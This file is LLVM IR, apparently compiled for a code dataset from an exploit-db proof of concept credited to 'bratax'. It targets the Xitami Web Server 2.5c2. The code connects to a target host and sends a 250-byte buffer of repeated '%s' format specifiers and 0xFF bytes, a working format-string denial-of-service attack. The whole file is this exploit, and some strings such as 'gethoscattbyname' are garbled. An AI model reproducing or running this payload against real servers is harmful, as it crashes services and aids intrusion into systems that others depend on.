; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_5354.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_5354.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i8, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [26 x i8] c"\0AXitami Web Server 2.5c2\0A\00", align 1
@.str.1 = private unnamed_addr constant [54 x i8] c"Format String PoC by bratax - http://www.bratax.be/\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [37 x i8] c"[+] tested on WinXP Pro SP2 & Vista\0A\00", align 1
@.str.3 = private unnamed_addr constant [27 x i8] c"[+] usage: %s <hostname>\0A\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [20 x i8] c"WSAStartup failed.\0A\00", align 1
@.str.5 = private unnamed_addr constant [17 x i8] c"gethoscattbyname\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@PORT = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [21 x i8] c"[-] Connect failed.\0A\00", align 1
@.str.8 = private unnamed_addr constant [28 x i8] c"[+] Server is listening...\0A\00", align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] c"\FF\00", align 1
@.str.11 = private unnamed_addr constant [37 x i8] c"[+] Sending format string request...\00", align 1
@.str.12 = private unnamed_addr constant [20 x i8] c"failed! Exiting...\0A\00", align 1
@.str.13 = private unnamed_addr constant [7 x i8] c"done.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.hostent*, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = alloca [250 x i8], align 16
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* %4, align 4
  %13 = icmp ne i32 %12, 2
  br i1 %13, label %14, label %22

14:                                               ; preds = %2
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0))
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.1, i64 0, i64 0))
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0))
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0), i8* %20)
  store i32 -1, i32* %3, align 4
  br label %108

22:                                               ; preds = %2
  %23 = call i32 @MAKEWORD(i32 1, i32 1)
  %24 = call i64 @WSAStartup(i32 %23, i32* %9)
  %25 = icmp ne i64 %24, 0
  br i1 %25, label %26, label %29

26:                                               ; preds = %22
  %27 = load i32, i32* @stderr, align 4
  %28 = call i32 @fprintf(i32 %27, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.4, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %108

29:                                               ; preds = %22
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 1
  %32 = load i8*, i8** %31, align 8
  %33 = call %struct.hostent* @gethostbyname(i8* %32)
  store %struct.hostent* %33, %struct.hostent** %7, align 8
  %34 = icmp eq %struct.hostent* %33, null
  br i1 %34, label %35, label %37

35:                                               ; preds = %29
  %36 = call i32 @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %108

37:                                               ; preds = %29
  %38 = load i32, i32* @AF_INET, align 4
  %39 = load i32, i32* @SOCK_STREAM, align 4
  %40 = call i32 @socket(i32 %38, i32 %39, i32 0)
  store i32 %40, i32* %6, align 4
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %44

42:                                               ; preds = %37
  %43 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %108

44:                                               ; preds = %37
  %45 = load i32, i32* @AF_INET, align 4
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  store i32 %45, i32* %46, align 4
  %47 = load i32, i32* @PORT, align 4
  %48 = call i32 @htons(i32 %47)
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %48, i32* %49, align 4
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  %51 = load %struct.hostent*, %struct.hostent** %7, align 8
  %52 = getelementptr inbounds %struct.hostent, %struct.hostent* %51, i32 0, i32 0
  %53 = load i64, i64* %52, align 8
  %54 = inttoptr i64 %53 to %struct.in_addr*
  %55 = bitcast %struct.in_addr* %50 to i8*
  %56 = bitcast %struct.in_addr* %54 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %55, i8* align 4 %56, i64 4, i1 false)
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %58 = call i32 @memset(i8* %57, i8 signext 0, i32 8)
  %59 = load i32, i32* %6, align 4
  %60 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %61 = call i32 @connect(i32 %59, %struct.sockaddr* %60, i32 4)
  %62 = icmp eq i32 %61, -1
  br i1 %62, label %63, label %67

63:                                               ; preds = %44
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0))
  %65 = load i32, i32* %6, align 4
  %66 = call i32 @closesocket(i32 %65)
  store i32 -1, i32* %3, align 4
  br label %108

67:                                               ; preds = %44
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.8, i64 0, i64 0))
  %69 = call i32 @Sleep(i32 1000)
  %70 = getelementptr inbounds [250 x i8], [250 x i8]* %10, i64 0, i64 0
  %71 = call i32 @memset(i8* %70, i8 signext 65, i32 250)
  store i32 0, i32* %11, align 4
  br label %72

72:                                               ; preds = %81, %67
  %73 = load i32, i32* %11, align 4
  %74 = icmp slt i32 %73, 200
  br i1 %74, label %75, label %84

75:                                               ; preds = %72
  %76 = getelementptr inbounds [250 x i8], [250 x i8]* %10, i64 0, i64 0
  %77 = load i32, i32* %11, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = call i32 @memcpy(i8* %79, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0), i32 2)
  br label %81

81:                                               ; preds = %75
  %82 = load i32, i32* %11, align 4
  %83 = add nsw i32 %82, 2
  store i32 %83, i32* %11, align 4
  br label %72

84:                                               ; preds = %72
  %85 = getelementptr inbounds [250 x i8], [250 x i8]* %10, i64 0, i64 0
  %86 = getelementptr inbounds i8, i8* %85, i64 200
  %87 = call i32 @memcpy(i8* %86, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i64 0, i64 0), i32 1)
  %88 = getelementptr inbounds [250 x i8], [250 x i8]* %10, i64 0, i64 0
  %89 = getelementptr inbounds i8, i8* %88, i64 249
  %90 = call i32 @memcpy(i8* %89, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i64 0, i64 0), i32 1)
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.11, i64 0, i64 0))
  %92 = call i32 @Sleep(i32 2000)
  %93 = load i32, i32* %6, align 4
  %94 = getelementptr inbounds [250 x i8], [250 x i8]* %10, i64 0, i64 0
  %95 = call i32 @send(i32 %93, i8* %94, i32 250, i32 0)
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %97, label %103

97:                                               ; preds = %84
  %98 = call i32 @Sleep(i32 2000)
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.12, i64 0, i64 0))
  %100 = load i32, i32* %6, align 4
  %101 = call i32 @closesocket(i32 %100)
  %102 = call i32 (...) @WSACleanup()
  store i32 -1, i32* %3, align 4
  br label %108

103:                                              ; preds = %84
  %104 = call i32 @Sleep(i32 2000)
  %105 = load i32, i32* %6, align 4
  %106 = call i32 @closesocket(i32 %105)
  %107 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.13, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %108

108:                                              ; preds = %103, %97, %63, %42, %35, %26, %14
  %109 = load i32, i32* %3, align 4
  ret i32 %109
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @closesocket(i32) #1

declare dso_local i32 @Sleep(i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @WSACleanup(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
